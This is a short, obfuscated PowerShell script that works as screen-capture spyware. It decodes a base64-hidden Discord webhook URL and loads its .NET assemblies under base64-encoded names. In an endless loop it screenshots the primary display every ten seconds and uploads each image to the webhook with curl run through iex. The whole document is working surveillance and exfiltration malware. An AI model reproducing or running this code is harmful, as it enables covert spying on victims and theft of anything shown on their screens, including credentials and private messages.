$a = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTI4Nzg3MDQ4NjA3MTczODQwMC9iTjN6ejdjdFRsck5uWElUZThzOThlN3JCSGdVYkZocnZIZXRKTDBNclV5TXF3N2RaMGVEb09qRGhqVER4NzNIRTE1Uw=="
$abc = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($a))

function tS {
    param ([string]$oF)
    Add-Type -AssemblyName ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String("U3lzdGVtLldpbmRvd3MuRm9ybXM=")))
    Add-Type -AssemblyName ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String("U3lzdGVtLkRyYXdpbmc=")))
    $b = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $bm = New-Object ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String("U3lzdGVtLkRyYXdpbmcuQml0bWFw"))) $b.Width, $b.Height
    $g = [System.Drawing.Graphics]::FromImage($bm)
    $g.CopyFromScreen($b.Location, [System.Drawing.Point]::Empty, $b.Size)
    $bm.Save($oF, [System.Drawing.Imaging.ImageFormat]::Png)
    $bm.Dispose()
    $g.Dispose()
}

function uS {
    param ([string]$fP)
    $c = "cmd.exe /c curl -F ""file=@$fP"" $abc"
    iex $c
}

while ($true) {
    $oF = "$env:TEMP\screenshot.png"
    tS -oF $oF
    uS -fP $oF
    sleep 10
}
